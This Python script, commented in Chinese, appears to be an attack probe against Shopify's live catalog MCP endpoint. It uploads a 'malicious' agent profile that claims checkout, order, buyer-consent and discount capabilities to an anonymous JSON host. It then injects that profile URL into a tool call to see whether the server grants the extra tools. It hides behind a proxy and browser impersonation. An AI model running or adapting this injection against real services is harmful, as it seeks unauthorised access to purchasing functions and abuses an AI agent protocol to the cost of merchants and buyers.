# -*- coding: utf-8 -*-
"""Profile 注入:托管恶意 agent profile -> 服务端 fetch 解析 -> 工具集变化?
jsonblob.com 匿名 JSON 托管
"""
import json, time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
MCP_URL = "https://catalog.shopify.com/api/ucp/mcp"

# 恶意 profile:声明比匿名面更多的能力(checkout/order 等敏感能力)
MALICIOUS_PROFILE = {
    "ucp": {
        "version": "2026-04-08",
        "services": {
            "dev.ucp.shopping": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/overview",
                "transport": "mcp",
                "schema": "https://ucp.dev/2026-04-08/services/shopping/mcp.openrpc.json"
            }]
        },
        "capabilities": {
            "dev.ucp.shopping.checkout": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/checkout",
                "schema": "https://ucp.dev/2026-04-08/schemas/shopping/checkout.json"
            }],
            "dev.ucp.shopping.order": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/order",
                "schema": "https://ucp.dev/2026-04-08/schemas/shopping/order.json"
            }],
            "dev.ucp.shopping.buyer_consent": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/buyer-consent",
                "schema": "https://ucp.dev/2026-04-08/schemas/shopping/buyer_consent.json"
            }],
            "dev.ucp.shopping.discount": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/discount",
                "schema": "https://ucp.dev/2026-04-08/schemas/shopping/discount.json"
            }],
            "dev.ucp.shopping.cart": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/cart",
                "schema": "https://ucp.dev/2026-04-08/schemas/shopping/cart.json"
            }],
            "dev.ucp.shopping.fulfillment": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/fulfillment",
                "schema": "https://ucp.dev/2026-04-08/schemas/shopping/fulfillment.json"
            }]
        }
    }
}

def create_blob():
    r = requests.post("https://jsonblob.com/api/jsonBlob", json=MALICIOUS_PROFILE, headers=H, proxies=PROXY, impersonate="chrome", timeout=30)
    loc = r.headers.get("Location")
    print(f"[jsonblob] HTTP {r.status_code} Location={loc}")
    return loc

def fetch_blob(blob_url):
    r = requests.get(blob_url, headers=H, proxies=PROXY, impersonate="chrome", timeout=30)
    print(f"[blob GET] HTTP {r.status_code} ct={r.headers.get('Content-Type')} len={len(r.text)}")
    return r

def mcp_tools_list(profile_url):
    body = {"jsonrpc": "2.0", "method": "tools/list", "id": 1, "params": {}}
    r = requests.post(MCP_URL, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
    names = []
    try:
        j = r.json()
        for t in j.get("result", {}).get("tools", []):
            names.append(t.get("name"))
    except Exception:
        pass
    print(f"[tools/list] HTTP {r.status_code} tools={names}")

def mcp_call_with_profile(profile_url):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile_url}}, "query": "shoes"}},
    }
    r = requests.post(MCP_URL, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
    print(f"[tools/call w/ malicious profile] HTTP {r.status_code} | {r.text[:300]}")

if __name__ == "__main__":
    print("== 基线 tools/list ==")
    mcp_tools_list(None)
    time.sleep(1)
    print("\n== 创建恶意 profile blob ==")
    blob = create_blob()
    if not blob:
        print("jsonblob 创建失败")
        raise SystemExit
    time.sleep(1)
    fetch_blob(blob)
    time.sleep(1)
    print("\n== 用恶意 profile 调用 ==")
    mcp_call_with_profile(blob)
    time.sleep(1)
    print("\n== 恶意 profile 后 tools/list ==")
    mcp_tools_list(blob)
